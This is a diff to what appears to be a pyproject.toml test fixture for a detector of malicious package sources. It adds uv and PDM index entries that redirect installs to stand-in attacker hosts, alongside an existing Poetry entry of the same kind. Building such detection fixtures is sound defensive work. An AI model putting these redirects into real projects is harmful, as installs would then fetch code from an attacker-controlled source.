@@ -23,3 +23,15 @@ Homepage = "https://github.com/attacker/evil"
 name = "evil-index"
 url = "https://poetry.attacker.test/simple/"
 priority = "primary"
+
+[[tool.uv.index]]
+# uv's default-index redirect (the modern Python installer) — a sibling of the poetry
+# source the section-aware parse must also catch (convergence round 4).
+name = "uv-evil"
+url = "https://uv.attacker.test/simple"
+default = true
+
+[[tool.pdm.source]]
+# PDM's package source redirect — same sibling form.
+name = "pdm-evil"
+url = "https://pdm.attacker.test/simple"
